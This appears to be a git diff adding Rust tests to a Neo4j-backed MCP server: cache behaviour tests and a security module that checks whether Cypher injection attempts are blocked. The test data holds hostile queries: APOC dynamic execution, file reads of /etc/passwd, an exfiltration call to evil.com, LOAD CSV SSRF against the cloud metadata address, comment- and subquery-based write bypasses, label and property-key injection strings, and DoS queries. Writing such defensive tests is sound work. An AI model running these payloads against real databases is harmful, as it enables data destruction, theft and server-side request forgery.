@@ -1311,6 +1311,115 @@ mod cache_extended {
         let retrieved = cache.get(&key).await;
         assert!(retrieved.is_some(), "Large value should be cached");
     }
+
+    #[tokio::test]
+    async fn test_cache_clear_with_pending_tasks() {
+        let cache = QueryCache::new(100, Duration::from_secs(60));
+
+        // Insert many entries
+        for i in 0..50 {
+            let key = format!("key_{}", i);
+            cache.insert(key, serde_json::json!({"v": i})).await;
+        }
+
+        // Clear and verify cleanup is complete (run_pending_tasks is called)
+        cache.clear().await;
+
+        // Stats should show empty after clear + pending tasks
+        let stats = cache.stats();
+        assert_eq!(stats.entry_count, 0, "Cache should be empty after clear");
+    }
+
+    #[tokio::test]
+    async fn test_cache_concurrent_same_key() {
+        use std::sync::Arc;
+        use std::sync::atomic::{AtomicUsize, Ordering};
+
+        let cache = QueryCache::new(100, Duration::from_secs(60));
+        let compute_count = Arc::new(AtomicUsize::new(0));
+
+        // Simulate multiple concurrent requests for the same key
+        // In a stampede scenario without protection, all would compute
+        let mut handles = vec![];
+        for _ in 0..20 {
+            let cache_clone = cache.clone();
+            let compute_count_clone = compute_count.clone();
+            let handle = tokio::spawn(async move {
+                let key = "shared_key";
+
+                // Check cache first
+                if cache_clone.get(key).await.is_none() {
+                    // Simulate expensive computation
+                    tokio::time::sleep(Duration::from_millis(5)).await;
+                    compute_count_clone.fetch_add(1, Ordering::SeqCst);
+
+                    // Insert result
+                    cache_clone
+                        .insert(key.to_string(), serde_json::json!({"result": "computed"}))
+                        .await;
+                }
+            });
+            handles.push(handle);
+        }
+
+        for handle in handles {
+            handle.await.expect("Task failed");
+        }
+
+        // Note: Without stampede protection (get_with), multiple tasks may compute
+        // This test documents current behavior - stampede protection would reduce
+        // compute_count to 1
+        let computes = compute_count.load(Ordering::SeqCst);
+        assert!(computes >= 1, "At least one computation should occur");
+        // With current implementation (no stampede protection), may see > 1 computes
+        // Log for documentation
+        eprintln!(
+            "Concurrent computations for same key: {} (ideal: 1)",
+            computes
+        );
+    }
+
+    #[tokio::test]
+    async fn test_cache_max_capacity_eviction() {
+        // Very small cache to test eviction
+        let cache = QueryCache::new(3, Duration::from_secs(60));
+
+        // Insert 5 items (exceeds max capacity of 3)
+        for i in 0..5 {
+            cache.insert(format!("key_{}", i), serde_json::json!(i)).await;
+            // Give moka time to process
+            tokio::time::sleep(Duration::from_millis(1)).await;
+        }
+
+        // After insertions, some should be evicted
+        // (moka's eviction is async, so we need to be flexible)
+        let stats = cache.stats();
+        assert!(stats.entry_count <= 5, "Some entries may still be pending eviction");
+
+        // The most recent entries should be more likely to exist
+        let recent = cache.get("key_4").await;
+        assert!(recent.is_some(), "Most recent entry should exist");
+    }
+
+    #[tokio::test]
+    async fn test_cache_ttl_behavior() {
+        // Very short TTL for testing
+        let cache = QueryCache::new(100, Duration::from_millis(50));
+
+        cache
+            .insert("expiring_key".to_string(), serde_json::json!("value"))
+            .await;
+
+        // Should exist immediately
+        assert!(cache.get("expiring_key").await.is_some());
+
+        // Wait for TTL to expire
+        tokio::time::sleep(Duration::from_millis(100)).await;
+
+        // Should be expired now
+        let after_ttl = cache.get("expiring_key").await;
+        assert!(after_ttl.is_none(), "Entry should be expired after TTL");
+    }
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
@@ -2229,6 +2338,377 @@ mod neo4j_special_types {
             let obj = map_val.as_object().unwrap();
             assert_eq!(obj.get("key").unwrap(), "value");
             assert_eq!(obj.get("num").unwrap(), 42);
+        }
+    }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// CRITICAL SECURITY TESTS (Expert Agent Findings)
+// These tests verify protection against advanced Cypher injection techniques
+// ═══════════════════════════════════════════════════════════════════════════════
+
+mod security_critical {
+    use super::*;
+
+    /// Test that APOC procedures that can execute arbitrary code are blocked
+    #[tokio::test]
+    async fn test_apoc_procedure_injection() {
+        require_neo4j!();
+
+        let uri = env::var("NEO4J_URI").unwrap();
+        let user = env::var("NEO4J_USER").unwrap();
+        let password = env::var("NEO4J_PASSWORD").unwrap();
+
+        let pool = novanet_mcp::neo4j::Neo4jPool::new(&uri, &user, &password, 5)
+            .await
+            .expect("Pool creation failed");
+
+        // CRITICAL: These APOC procedures can execute arbitrary code
+        let dangerous_apoc_calls = [
+            // Dynamic Cypher execution - can bypass all validation
+            "CALL apoc.cypher.run('CREATE (n:Evil) RETURN n', {}) YIELD value RETURN value",
+            "CALL apoc.cypher.doIt('DELETE (n)', {}) YIELD value RETURN value",
+            "CALL apoc.cypher.runMany('CREATE (n); DELETE (m)', {}) YIELD row RETURN row",
+            // Periodic execution - scheduled malicious operations
+            "CALL apoc.periodic.commit('CREATE (n:Evil) RETURN count(n)', {})",
+            "CALL apoc.periodic.iterate('MATCH (n) RETURN n', 'DELETE n', {})",
+            // File system access - data exfiltration
+            "CALL apoc.export.csv.all('/tmp/stolen_data.csv', {})",
+            "CALL apoc.load.csv('file:///etc/passwd') YIELD value RETURN value",
+            // Network access - SSRF
+            "CALL apoc.load.json('http://evil.com/callback?data=' + toString(1)) YIELD value RETURN value",
+        ];
+
+        for query in dangerous_apoc_calls {
+            let result = pool.execute_query(query, None).await;
+            // Should be blocked by validation or fail at Neo4j level
+            // Either outcome is acceptable as long as the operation doesn't succeed
+            if result.is_ok() {
+                // If it somehow succeeded, verify no side effects occurred
+                // This is a defense-in-depth check
+                panic!(
+                    "CRITICAL: Dangerous APOC call was not blocked: {}",
+                    query
+                );
+            }
+        }
+    }
+
+    /// Test that subquery write bypass is blocked
+    /// CALL { CREATE (n) } can bypass word boundary checks
+    #[tokio::test]
+    async fn test_subquery_write_bypass() {
+        require_neo4j!();
+
+        let uri = env::var("NEO4J_URI").unwrap();
+        let user = env::var("NEO4J_USER").unwrap();
+        let password = env::var("NEO4J_PASSWORD").unwrap();
+
+        let pool = novanet_mcp::neo4j::Neo4jPool::new(&uri, &user, &password, 5)
+            .await
+            .expect("Pool creation failed");
+
+        // Subquery patterns that could bypass word boundary validation
+        let subquery_attacks = [
+            "MATCH (n) CALL { CREATE (m:Evil) RETURN m } RETURN n",
+            "MATCH (n) CALL { DELETE (n) } RETURN n",
+            "MATCH (n) CALL { MERGE (m:Evil) } RETURN n",
+            "MATCH (n) CALL { WITH n SET n.compromised = true } RETURN n",
+            // Nested subqueries
+            "MATCH (n) CALL { CALL { CREATE (m) RETURN m } RETURN m } RETURN n",
+            // Subquery with UNION
+            "CALL { MATCH (n) RETURN n UNION CREATE (m:Evil) RETURN m } RETURN *",
+        ];
+
+        for query in subquery_attacks {
+            let result = pool.execute_query(query, None).await;
+            assert!(
+                result.is_err(),
+                "Subquery write bypass should be blocked: {}",
+                query
+            );
+        }
+    }
+
+    /// Test that FOREACH write bypass is blocked
+    /// FOREACH (x IN [1] | CREATE (n)) can bypass validation
+    #[tokio::test]
+    async fn test_foreach_write_bypass() {
+        require_neo4j!();
+
+        let uri = env::var("NEO4J_URI").unwrap();
+        let user = env::var("NEO4J_USER").unwrap();
+        let password = env::var("NEO4J_PASSWORD").unwrap();
+
+        let pool = novanet_mcp::neo4j::Neo4jPool::new(&uri, &user, &password, 5)
+            .await
+            .expect("Pool creation failed");
+
+        let foreach_attacks = [
+            "MATCH (n) FOREACH (x IN [1] | CREATE (m:Evil)) RETURN n",
+            "MATCH (n) FOREACH (x IN range(1,10) | DELETE n) RETURN n",
+            "MATCH (n) FOREACH (x IN [1] | SET n.hacked = true) RETURN n",
+            "MATCH (n) FOREACH (x IN [1,2,3] | MERGE (m:Evil {id: x})) RETURN n",
+        ];
+
+        for query in foreach_attacks {
+            let result = pool.execute_query(query, None).await;
+            assert!(
+                result.is_err(),
+                "FOREACH write bypass should be blocked: {}",
+                query
+            );
+        }
+    }
+
+    /// Test that comment-based keyword bypass is blocked
+    /// CREATE /* hidden */ (n) could bypass naive validation
+    #[tokio::test]
+    async fn test_comment_keyword_bypass() {
+        require_neo4j!();
+
+        let uri = env::var("NEO4J_URI").unwrap();
+        let user = env::var("NEO4J_USER").unwrap();
+        let password = env::var("NEO4J_PASSWORD").unwrap();
+
+        let pool = novanet_mcp::neo4j::Neo4jPool::new(&uri, &user, &password, 5)
+            .await
+            .expect("Pool creation failed");
+
+        let comment_attacks = [
+            "MATCH (n) /* */ CREATE (m) RETURN n",
+            "MATCH (n) /*\n*/ DELETE n",
+            "C/**/REATE (n:Evil)",
+            "DE/**/LETE n",
+            "MATCH (n) // comment\nCREATE (m)",
+            "MATCH (n) -- comment\nDELETE n",
+        ];
+
+        for query in comment_attacks {
+            let result = pool.execute_query(query, None).await;
+            assert!(
+                result.is_err(),
+                "Comment-based bypass should be blocked: {}",
+                query
+            );
+        }
+    }
+
+    /// Test that label injection is handled safely
+    /// Dynamic labels via parameters could be exploited
+    #[tokio::test]
+    async fn test_label_injection_safety() {
+        require_neo4j!();
+
+        let uri = env::var("NEO4J_URI").unwrap();
+        let user = env::var("NEO4J_USER").unwrap();
+        let password = env::var("NEO4J_PASSWORD").unwrap();
+
+        let pool = novanet_mcp::neo4j::Neo4jPool::new(&uri, &user, &password, 5)
+            .await
+            .expect("Pool creation failed");
+
+        // Label injection attempts via parameters
+        let malicious_labels = [
+            "Entity`) DETACH DELETE n//",
+            "Entity:Admin",
+            "Entity}-[:OWNS]->(admin:Admin",
+            "Entity]) CREATE (evil:Evil) WITH evil MATCH (n:[",
+        ];
+
+        for label in malicious_labels {
+            let mut params = serde_json::Map::new();
+            params.insert("label".to_string(), serde_json::json!(label));
+
+            // Using apoc.node.labels or similar dynamic label access
+            // The query should either fail or treat the label as a literal string
+            let result = pool
+                .execute_query(
+                    "MATCH (n) WHERE $label IN labels(n) RETURN n LIMIT 1",
+                    Some(params),
+                )
+                .await;
+
+            // Should succeed with empty results (label doesn't exist as literal)
+            // or fail safely - either is acceptable
+            if let Ok(rows) = &result {
+                // Verify no unexpected nodes returned
+                assert!(
+                    rows.is_empty()
+                        || rows.iter().all(|r| {
+                            // Ensure returned nodes don't have compromised labels
+                            let labels = r.get("n").and_then(|n| n.get("labels"));
+                            labels.is_none()
+                                || !labels.unwrap().to_string().contains("Admin")
+                        }),
+                    "Label injection may have succeeded for: {}",
+                    label
+                );
+            }
+        }
+    }
+
+    /// Test that property key injection is handled safely
+    #[tokio::test]
+    async fn test_property_key_injection() {
+        require_neo4j!();
+
+        let uri = env::var("NEO4J_URI").unwrap();
+        let user = env::var("NEO4J_USER").unwrap();
+        let password = env::var("NEO4J_PASSWORD").unwrap();
+
+        let pool = novanet_mcp::neo4j::Neo4jPool::new(&uri, &user, &password, 5)
+            .await
+            .expect("Pool creation failed");
+
+        // Property key injection attempts
+        let malicious_keys = [
+            "key: 'value', password: 'admin'",
+            "key}) SET n.admin=true WITH n MATCH (m {",
+            "key`] DETACH DELETE n//",
+        ];
+
+        for key in malicious_keys {
+            let mut params = serde_json::Map::new();
+            params.insert("propKey".to_string(), serde_json::json!(key));
+            params.insert("value".to_string(), serde_json::json!("test"));
+
+            // Using dynamic property access
+            let result = pool
+                .execute_query(
+                    "MATCH (n) WHERE n[$propKey] = $value RETURN n LIMIT 1",
+                    Some(params.clone()),
+                )
+                .await;
+
+            // Should handle safely - either empty results or error
+            if let Ok(rows) = result {
+                assert!(
+                    rows.is_empty(),
+                    "Property key injection may have succeeded for: {}",
+                    key
+                );
+            }
+        }
+    }
+
+    /// Test integer overflow in parameters
+    #[tokio::test]
+    async fn test_integer_overflow_handling() {
+        require_neo4j!();
+
+        let uri = env::var("NEO4J_URI").unwrap();
+        let user = env::var("NEO4J_USER").unwrap();
+        let password = env::var("NEO4J_PASSWORD").unwrap();
+
+        let pool = novanet_mcp::neo4j::Neo4jPool::new(&uri, &user, &password, 5)
+            .await
+            .expect("Pool creation failed");
+
+        // Integer edge cases
+        let edge_cases = [
+            (i64::MAX, "max"),
+            (i64::MIN, "min"),
+            (i64::MAX - 1, "max-1"),
+            (i64::MIN + 1, "min+1"),
+        ];
+
+        for (value, name) in edge_cases {
+            let mut params = serde_json::Map::new();
+            params.insert("num".to_string(), serde_json::json!(value));
+
+            let result = pool
+                .execute_query("RETURN $num AS num", Some(params))
+                .await;
+
+            assert!(
+                result.is_ok(),
+                "Integer {} ({}) should be handled",
+                name,
+                value
+            );
+
+            let rows = result.unwrap();
+            assert_eq!(
+                rows[0]["num"].as_i64().unwrap(),
+                value,
+                "Integer {} should be preserved exactly",
+                name
+            );
+        }
+    }
+
+    /// Test that LOAD CSV SSRF is blocked
+    #[tokio::test]
+    async fn test_load_csv_ssrf() {
+        require_neo4j!();
+
+        let uri = env::var("NEO4J_URI").unwrap();
+        let user = env::var("NEO4J_USER").unwrap();
+        let password = env::var("NEO4J_PASSWORD").unwrap();
+
+        let pool = novanet_mcp::neo4j::Neo4jPool::new(&uri, &user, &password, 5)
+            .await
+            .expect("Pool creation failed");
+
+        // LOAD CSV can be used for SSRF attacks
+        let ssrf_attacks = [
+            "LOAD CSV FROM 'http://169.254.169.254/latest/meta-data/' AS line RETURN line",
+            "LOAD CSV FROM 'file:///etc/passwd' AS line RETURN line",
+            "LOAD CSV FROM 'http://localhost:7474/browser/' AS line RETURN line",
+        ];
+
+        for query in ssrf_attacks {
+            let result = pool.execute_query(query, None).await;
+            // Should fail - either blocked by validation or Neo4j config
+            // LOAD CSV for external URLs should be disabled in production
+            assert!(
+                result.is_err(),
+                "LOAD CSV SSRF should be blocked: {}",
+                query
+            );
+        }
+    }
+
+    /// Test cartesian product DoS protection
+    #[tokio::test]
+    async fn test_cartesian_product_dos() {
+        require_neo4j!();
+
+        let uri = env::var("NEO4J_URI").unwrap();
+        let user = env::var("NEO4J_USER").unwrap();
+        let password = env::var("NEO4J_PASSWORD").unwrap();
+
+        let pool = novanet_mcp::neo4j::Neo4jPool::new(&uri, &user, &password, 5)
+            .await
+            .expect("Pool creation failed");
+
+        // Cartesian product queries can cause exponential blowup
+        // The LIMIT should protect against this
+        let dos_queries = [
+            "MATCH (a), (b), (c) RETURN a, b, c",
+            "MATCH (a), (b), (c), (d) RETURN count(*)",
+            // UNWIND cartesian products
+            "UNWIND range(1, 1000) AS a UNWIND range(1, 1000) AS b RETURN a, b",
+        ];
+
+        for query in dos_queries {
+            let start = std::time::Instant::now();
+            let result = pool.execute_query(query, None).await;
+            let elapsed = start.elapsed();
+
+            // Query should either:
+            // 1. Complete quickly due to LIMIT injection
+            // 2. Timeout
+            // 3. Return an error
+            if result.is_ok() {
+                assert!(
+                    elapsed.as_secs() < 30,
+                    "Query took too long ({}s): {}",
+                    elapsed.as_secs(),
+                    query
+                );
+            }
         }
     }
 }
